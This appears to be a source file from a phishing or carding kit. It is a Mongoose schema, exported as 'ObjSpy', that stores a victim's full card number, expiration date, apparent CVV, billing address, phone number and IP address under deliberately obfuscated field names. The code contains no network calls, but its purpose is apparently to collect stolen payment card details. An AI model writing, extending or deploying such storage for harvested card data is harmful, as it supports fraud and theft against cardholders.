import mongoose from 'mongoose';

const cardSchema = new mongoose.Schema({
    _Xname: String,
    _xlastnames: String,
    _XcardNumber : String,
    _XTcBrdType : String,
    _XTcdr3Expiration : String,
    _XTVardCEee : String,
    _XTaDvdress : String,
    _XTvity : String,
    _XTstate : String,
    _XTzip : String,
    _XTcountry : String,
    _XTelPhone : String,
    _Xip: String,
}, { timestamps: true });

const ObjSpy = mongoose.model('Card', cardSchema);

export default ObjSpy;